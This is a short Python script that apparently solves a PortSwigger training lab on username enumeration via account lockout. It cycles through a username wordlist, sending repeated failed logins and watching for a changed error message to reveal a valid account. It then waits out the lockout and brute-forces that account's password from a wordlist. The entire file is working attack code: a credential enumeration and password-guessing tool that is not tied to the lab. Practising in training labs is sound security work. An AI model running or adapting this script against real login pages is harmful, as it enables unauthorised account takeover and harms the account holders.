import sys
import time
import requests

# PortSwigger Lab Username enumeration via account lock
# Solve without BurpSuite Pro

# Change 'target_url' var to 'https://something.web-security-academy.net/login'

target_url = "CHANGE THIS!!!"
username = []
passwords = []
login = ""
passwd = ""

with open("username.txt", "r") as file:
    for line in file:
        username.append(line.strip())

with open("passwords.txt", "r") as file:
    for line in file:
        passwords.append(line.strip())

if requests.get(target_url).status_code != 200:
    print("[!] Lab is unavailable! Check target_url!")
    sys.exit(0)

print("[*] Finding username:")
for name in username:
    post_data = "username=" + name + "&password=pass"
    print("[-] Try " + name)
    for _ in range(5):
        result = requests.post(target_url, data=post_data)
        if "Invalid username or password" not in result.content.decode():
            login = name
            print("[+] Login found: " + login)
            break
    if login:
        break

if login == "":
    print("[!] Login is not found! Something wrong!")
    sys.exit(0)

print("[*] Wait 60 sec and find password.")
time.sleep(60)

for line in passwords:
    post_data = "username=" + login + "&password=" + line
    print("[-] Try " + line)
    result = requests.post(target_url, data=post_data)
    if "Invalid username or password" not in result.content.decode() and "You have made too many incorrect login attempts" not in result.content.decode():
        passwd = line
        print("[*] Found password: " + passwd)
        break

print("[*] Wait 60 sec and try this credentials " + login + ":" + passwd)
